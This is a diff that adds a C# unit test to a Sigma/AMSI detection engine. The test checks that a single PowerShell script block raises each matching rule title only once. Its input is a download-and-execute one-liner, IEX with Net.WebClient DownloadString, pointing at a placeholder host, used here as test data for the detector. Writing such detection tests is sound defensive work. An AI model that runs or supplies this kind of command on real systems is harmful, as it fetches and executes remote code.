@@ -64,3 +64,16 @@ public sealed class SigmaAlertPersistenceTests : IAsyncLifetime
         Assert.Contains(detections, d => d.Title.Contains("Sigma", StringComparison.OrdinalIgnoreCase));
     }
 }
+
+public sealed class SigmaRuleDeduplicationTests
+{
+    [Fact]
+    public void OneScriptBlockRaisesEachRuleTitleOnce()
+    {
+        var processor = new SigmaAmsiEventProcessor(Microsoft.Extensions.Logging.Abstractions.NullLogger<SigmaAmsiEventProcessor>.Instance);
+        var detections = processor.ProcessScriptBlock(new ScriptBlock(1, DateTimeOffset.UtcNow,
+            "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", 1, 1));
+        Assert.NotEmpty(detections);
+        Assert.Equal(detections.Count, detections.Select(d => d.Title).Distinct().Count());
+    }
+}
